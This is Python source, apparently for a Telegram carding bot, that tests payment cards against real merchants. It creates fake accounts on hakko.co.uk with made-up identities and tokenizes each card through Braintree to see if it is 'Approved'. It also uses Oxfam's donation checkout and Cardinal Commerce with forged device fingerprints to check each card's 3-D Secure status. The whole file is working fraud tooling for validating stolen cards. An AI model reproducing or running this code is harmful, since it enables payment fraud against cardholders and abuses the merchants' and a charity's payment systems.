# === Start of reg.py ===
import re
def reg(cc):
	regex = r'\d+'
	matches = re.findall(regex, cc)
	match = ''.join(matches)
	n = match[:16]
	mm = match[16:18]
	yy = match[18:20]
	if yy == '20':
		yy = match[18:22]
		if n.startswith("3"):
			cvc = match[22:26]
		else:
			cvc = match[22:25]
	else:
		if n.startswith("3"):
			cvc = match[20:24]
		else:
			cvc = match[20:23]
	cc = f"{n}|{mm}|{yy}|{cvc}"
	if not re.match(r'^\d{16}$', n):
		return
	if not re.match(r'^\d{3,4}$', cvc):
		return
	return cc
	
# === End of reg.py ===

# === Start of gates.py ===
from reg import reg
from gates import *
from datetime import datetime, timedelta
from faker import Faker
import threading
import telebot
import requests
import json
import random
import time
from multiprocessing import Process
import string
from telebot import types
import re

import os
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()

		
	def generate_full_name():
				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
				full_name = random.choice(first_names) + " " + random.choice(last_names)
				first_name, last_name = full_name.split()

				return first_name, last_name
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]

		return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
			
	corr = generate_random_code()
			
	sess = generate_random_code()
			
		
	
	
	
	headers = {
    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get('https://hakko.co.uk/my-account/', headers=headers)
	
	
	
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	
	
	
	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	data = {
    'email': acc,
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://hakko.co.uk/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2024-10-30 07:31:46',
    'wc_order_attribution_session_pages': '13',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': user,
    'woocommerce-register-nonce': register,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
}
	
	response = r.post('https://hakko.co.uk/my-account/', headers=headers, data=data)
	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

	response = r.get('https://hakko.co.uk/my-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	data = {
    'billing_first_name': first_name,
    'billing_last_name': last_name,
    'billing_company': '',
    'billing_country': 'GB',
    'billing_address_1': street_address,
    'billing_address_2': '',
    'billing_city': city,
    'billing_state': 'California',
    'billing_postcode': 'GL56 0SU',
    'billing_phone': num,
    'billing_email': acc,
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}

	
	response = r.post('https://hakko.co.uk/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	response = r.get('https://hakko.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	headers = {
	    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}
	
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '76c2a9b4-9f0a-4a19-b5d1-9b78bced2aca',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': 'GL56 0SU',
                    'streetAddress': '861 N Sunset Ave',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
		
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	
	tok = response.json()['data']['tokenizeCreditCard']['token']

	headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
	    'amount': '0.00',
	    'browserColorDepth': 24,
	    'browserJavaEnabled': False,
	    'browserJavascriptEnabled': True,
	    'browserLanguage': 'ar-EG',
	    'browserScreenHeight': 800,
	    'browserScreenWidth': 360,
	    'browserTimeZone': -180,
	    'deviceChannel': 'Browser',
	    'additionalInfo': {
	        #     'ipAddress': '197.63.121.174',
	        'billingLine1': '861 N Sunset Ave',
	        'billingLine2': '',
	        'billingCity': 'La Puente',
	        'billingState': '',
	        'billingPostalCode': 'GL56 0SU',
	        'billingCountryCode': 'GB',
	        'billingPhoneNumber': '6269188500',
	        'billingGivenName': 'Meroo',
	        'billingSurname': 'Ayman',
	        'email': 'hdjd737@gmail.com',
	    },
	    'challengeRequested': True,
	    'bin': '423067',
	    #     'dfReferenceId': '0_f39019d9-4a94-4393-8ab1-ffd7b59d7f1d',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.106.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 910,
	        'issuerDeviceDataCollectionTimeElapsed': 3322,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': au,
	    'braintreeLibraryVersion': 'braintree/web/3.106.0',
	    '_meta': {
	        'merchantAppId': 'hakko.co.uk',
	        'platform': 'web',
	        'sdkVersion': '3.106.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '76c2a9b4-9f0a-4a19-b5d1-9b78bced2aca',
	    },
	}
	
	response = requests.post(
	    f'https://api.braintreegateway.com/merchants/wcr3cvc237q7jz6b/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	
	nonc = (response.json()['paymentMethod']['nonce'])
	
	headers = {
	    'authority': 'hakko.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://hakko.co.uk',
    'referer': 'https://hakko.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
		
	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': nonc,
    'braintree_cc_device_data': '{"device_session_id":"48ba20cd6f09dc5749a68506dd05dfd5","fraud_merchant_id":null,"correlation_id":"76c2a9b4-9f0a-4a19-b5d1-9b78bced"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1YjY1NzViNS0wZDVkLTQ4YjYtOWY4Ny1lYmE1NWQyNmM4NmIiLCJpYXQiOjE3MzAyNzM2NjIsImV4cCI6MTczMDI4MDg2MiwiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.leT5UoODvDMPw5eAXLA0uTbyNMIcjT0t3SLx1L8Hvjk"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
		
	response = r.post(
	    'https://hakko.co.uk/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		#print(result) 
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			time.sleep(5)
			result = "try again"
		else:
			result = "Error"
			#print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result:
			return 'Approved'
	else:
		return result

		
		
		
		
		
		
		
		
		

import jwt
import re,base64
import user_agent


us = user_agent.generate_user_agent()
def vbv(ccx):
	import requests
	import re
	import random
	import string
	import base64
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	proxies = ['43.133.59.220:3128']
	user = user_agent.generate_user_agent()
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	r = requests.session()

	headers = {
	    'user-agent': us,
	}
	response = r.get('https://www.oxfam.org.uk/_donate/api/configuration/zakat/', headers=headers)
	no=response.json()['payment_methods'][0]['options']['client_authorization']
	encoded_text = no
	
	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://www.oxfam.org.uk',
	    'referer': 'https://www.oxfam.org.uk/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': us,
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '29fd59fa-6d49-469d-a7a3-6346ae1fbc81',
	    },
	    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
	    'operationName': 'ClientConfiguration',
	}
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
	import requests
	headers = {
	    'authority': 'centinelapi.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json;charset=UTF-8',
	    'origin': 'https://www.oxfam.org.uk',
	    'referer': 'https://www.oxfam.org.uk/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': us,
	    'x-cardinal-tid': 'Tid-b6ac952f-8287-4d0f-b116-a45b4f379a60',
	}
	json_data = {
	    'BrowserPayload': {
	        'Order': {
	            'OrderDetails': {},
	            'Consumer': {
	                'BillingAddress': {},
	                'ShippingAddress': {},
	                'Account': {},
	            },
	            'Cart': [],
	            'Token': {},
	            'Authorization': {},
	            'Options': {},
	            'CCAExtension': {},
	        },
	        'SupportsAlternativePayments': {
	            'cca': True,
	            'hostedFields': False,
	            'applepay': False,
	            'discoverwallet': False,
	            'wallet': False,
	            'paypal': False,
	            'visacheckout': False,
	        },
	    },
	    'Client': {
	        'Agent': 'SongbirdJS',
	        'Version': '1.35.0',
	    },
	    'ConsumerSessionId': None,
	    'ServerJWT': cardnal,
	}
	
	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	payload = response.json()['CardinalJWT']
	
	payload_dict = jwt.decode(payload, options={"verify_signature": False})
	
	reference_id = payload_dict['ReferenceId']
	import requests
	headers = {
	    'authority': 'geo.cardinalcommerce.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json',
	    'origin': 'https://geo.cardinalcommerce.com',
	    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=6241bfe007f6d918af7145b3&tmEventType=PAYMENT&referenceId=0_e46601f4-7ea9-4dd6-b622-8ec4e5fd83d9&geolocation=false&origin=Songbird',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': us,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'Cookies': {
	        'Legacy': True,
	        'LocalStorage': True,
	        'SessionStorage': True,
	    },
	    'DeviceChannel': 'Browser',
	    'Extended': {
	        'Browser': {
	            'Adblock': True,
	            'AvailableJsFonts': [],
	            'DoNotTrack': 'unknown',
	            'JavaEnabled': False,
	        },
	        'Device': {
	            'ColorDepth': 24,
	            'Cpu': 'unknown',
	            'Platform': 'Linux armv81',
	            'TouchSupport': {
	                'MaxTouchPoints': 5,
	                'OnTouchStartAvailable': True,
	                'TouchEventCreationSuccessful': True,
	            },
	        },
	    },
	    'Fingerprint': 'e8ea0ac75c934e00093b220b0387b191',
	    'FingerprintingTime': 1226,
	    'FingerprintDetails': {
	        'Version': '1.5.1',
	    },
	    'Language': 'en-US',
	    'Latitude': None,
	    'Longitude': None,
	    'OrgUnitId': '6241bfe007f6d918af7145b3',
	    'Origin': 'Songbird',
	    'Plugins': [],
	    'ReferenceId': reference_id,
	    'Referrer': 'https://www.oxfam.org.uk/',
	    'Screen': {
	        'FakedResolution': False,
	        'Ratio': 2.2213740458015265,
	        'Resolution': '873x393',
	        'UsableResolution': '873x393',
	        'CCAScreenSize': '02',
	    },
	    'CallSignEnabled': None,
	    'ThreatMetrixEnabled': False,
	    'ThreatMetrixEventType': 'PAYMENT',
	    'ThreatMetrixAlias': 'Default',
	    'TimeOffset': -180,
	    'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'UserAgentDetails': {
	        'FakedOS': False,
	        'FakedBrowser': False,
	    },
	    'BinSessionId': 'cc6a1f58-3b7c-46cd-ad99-18ef1837da9e',
	}
	response = r.post(
	    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
	    headers=headers,
	    json=json_data,
	)
	import requests
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': us,
	}
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '29fd59fa-6d49-469d-a7a3-6346ae1fbc81',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'cardholderName': 'john  mayer ',
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
	tok = response.json()['data']['tokenizeCreditCard']['token']
	import requests
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/json',
	    'origin': 'https://www.oxfam.org.uk',
	    'referer': 'https://www.oxfam.org.uk/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': us,
	}
	json_data = {
	    'amount': '5.00',
	    'additionalInfo': {
	        'billingLine1': 'T F G Fabrics',
	        'billingLine2': 'Guardian House, Gatherley Road Industrial Estate',
	        'billingCity': 'Richmond',
	        'billingPostalCode': 'DL10 7JQ',
	        'billingCountryCode': 'GB',
	        'billingPhoneNumber': '9108749652',
	        'billingGivenName': 'john ',
	        'billingSurname': 'mayer ',
	        'email': 'magdyjohn25@gmail.com',
	    },
	    'bin': '518155',
	    'dfReferenceId': reference_id,
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.76.4',
	        'cardinalDeviceDataCollectionTimeElapsed': 458,
	        'issuerDeviceDataCollectionTimeElapsed': 7557,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': au,
	    'braintreeLibraryVersion': 'braintree/web/3.76.4',
	    '_meta': {
	        'merchantAppId': 'www.oxfam.org.uk',
	        'platform': 'web',
	        'sdkVersion': '3.76.4',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '29fd59fa-6d49-469d-a7a3-6346ae1fbc81',
	    },
	}
	response = r.post(
	    f'https://api.braintreegateway.com/merchants/27q44ks74yr25b2f/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)

	
	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	
	if 'successful' in vbv:
	       return '3DS Authenticate Successful'
	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
